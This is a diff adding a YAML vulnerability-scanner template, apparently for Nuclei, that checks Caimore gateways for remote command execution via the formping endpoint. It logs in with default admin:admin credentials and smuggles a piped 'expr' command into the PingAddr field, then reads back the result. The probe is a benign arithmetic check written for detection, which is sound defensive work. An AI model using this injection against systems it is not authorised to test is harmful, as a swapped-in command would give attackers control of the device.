@@ -1,0 +1,45 @@
+id: caimore-formping-rce
+info:
+  name: Caimore Gateway formping Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+  t2: "{{rand_int(10, 100)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/goform/formping"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+    body: |-
+      PingAddr=127.0.0.1%7Cexpr+{{t1}}+-+{{t2}}&PingPackNumb=1&PingMsg=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "location.href=document.referrer"
+  - id: step2
+    method: GET
+    path:
+      - "{{BaseURL}}/pingmessages"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
